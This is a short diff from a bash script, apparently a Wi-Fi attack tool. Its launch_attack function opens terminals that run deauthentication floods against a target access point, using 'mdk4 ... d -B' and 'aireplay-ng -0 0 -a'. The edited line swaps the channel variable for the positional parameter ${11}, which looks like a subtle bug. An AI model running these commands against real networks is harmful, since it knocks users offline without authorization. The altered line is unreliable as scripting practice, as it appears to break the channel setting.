@@ -194,7 +194,7 @@ function launch_attack() {
         xterm -fg "#FF0000" -T "Deauth${ESSID} with mdk4" -e /bin/bash -l -c "mdk4 ${iface} d -B ${BSSID} -c ${channel}"
         ;;
       2 )
-        xterm -T "Wait... Set Channel" -e /bin/bash -l -c "timeout 2 airodump-ng -c ${channel} ${iface}"
+        xterm -T "Wait... Set Channel" -e /bin/bash -l -c "timeout 2 airodump-ng -c ${11} ${iface}"
         sleep 1
         xterm -fg "#FF0000" -T "Deauth${ESSID} with aireplay-ng" -e /bin/bash -l -c "aireplay-ng -0 0 -a ${BSSID} --ignore-negative-one ${iface}"
     esac
